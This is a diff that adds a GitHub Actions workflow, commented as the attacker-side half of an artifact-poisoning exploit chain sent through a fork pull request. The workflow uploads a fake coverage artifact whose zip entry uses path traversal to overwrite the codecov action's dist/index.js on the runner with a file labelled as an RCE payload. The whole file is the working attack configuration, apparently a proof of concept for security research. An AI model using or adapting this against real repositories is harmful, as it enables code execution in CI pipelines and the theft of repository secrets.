@@ -1,0 +1,28 @@
+# Attacker-side half of the chain, exactly as it looks for a fork PR:
+# a pull_request-triggered run in the BASE repository (read-only token, no secrets)
+# that uploads an artifact whose zip entry escapes the extraction directory.
+# In a real attack this file (or an edit to an existing workflow) travels in the
+# attacker's PR: pull_request runs use the workflow files from the PR merge ref.
+name: coverage (plant)
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: fake coverage upload
+        uses: ./.github/actions/plant
+        env:
+          INPUT_EXTRACT_DIR: "../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x"
+        with:
+          name: coverage-report-ubuntu-latest-20.x
+          pairs: "poc-payload/rce-codecov.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
